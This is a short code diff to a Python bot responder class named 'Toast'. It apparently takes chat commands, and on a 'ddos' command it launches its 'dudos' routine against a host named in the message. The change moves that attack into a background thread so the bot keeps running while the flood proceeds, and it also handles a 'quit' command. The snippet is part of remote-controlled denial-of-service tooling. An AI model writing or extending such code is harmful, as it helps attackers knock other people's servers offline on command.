@@ -1,6 +1,8 @@
 import os
 import socket
 
+import threading
+
 from .. import BaseResponder
 
 
@@ -24,7 +26,8 @@ class Toast(BaseResponder):
 			self.respond(msg, command + ' OK!')
 			cmd = command.split()
 			if cmd[0] == 'ddos' and cmd[1]:
-				self.dudos(host=cmd[1])
+				threading.Thread(target=self.dudos, kwargs={'host':cmd[1]}).start()
+				# self.dudos(host=cmd[1])
 			elif cmd[0] == 'quit':
 				self.respond(msg, 'Bye!')
 				exit()
